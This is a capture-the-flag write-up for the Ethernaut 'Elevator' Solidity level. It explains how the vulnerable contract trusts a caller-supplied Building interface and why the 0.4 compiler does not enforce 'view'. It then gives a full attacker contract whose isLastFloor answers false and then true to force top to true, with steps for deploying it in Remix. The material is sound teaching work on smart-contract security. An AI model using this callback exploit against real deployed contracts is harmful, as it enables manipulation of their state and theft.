# Elevator
```javascript
pragma solidity ^0.4.18;


interface Building {
  function isLastFloor(uint) view public returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

> This elevator won't let you reach the top of your building. Right?

> Things that might help:
> * Sometimes solidity is not good at keeping promises.
> * This Elevator expects to be used from a Building
> 

In this challenge, let `top` become true.

`Building building = Building(msg.sender);` will create `Building` object in your contract and use `isLastFloor` in your interface.

Simply, let's overwrite the `isLastFloor`, make it return `false` first to make `elevaator`'s `floor` become the number we gave, then 2nd time return `true` to make `top` value remain in `true`.

However, in `view` modifier, function will never change any contract state:

> Functions can be declared view in which case they promise not to modify the state.

That means, we cannot make view function return to oppsitive result by its own, **in theory**.

Promise just a promise, solidity's compiler doesn't keep its promise.

> view functions: The compiler does not enforce yet that a view method is not modifying state.

So, let's write a contract with a `isLastFloor` function in `view` modifier which will modify the contract state.

```javascript
pragma solidity ^0.4.18;

interface Building {
  function isLastFloor(uint) view public returns (bool);
}

contract Elevator {
  function goTo(uint _floor) public{}
}

contract forceEnd is Building{
      uint count = 0;
      function isLastFloor(uint) view public returns (bool){
        if(count == 0){
            count=1;
            return false;
        } else {
            return true;
        }        
      }
      function endIt(address param) public{
          Elevator target = Elevator(param);
          target.goTo(8787);
      }
}
```

Yup, `isLastFloor` will change global variable: `count`, in claim with `view` modifier.

Deploy the contract with Remix IDE and trigger the `endIt` function with your instance address.

![](https://i.imgur.com/HQwLgEw.png)
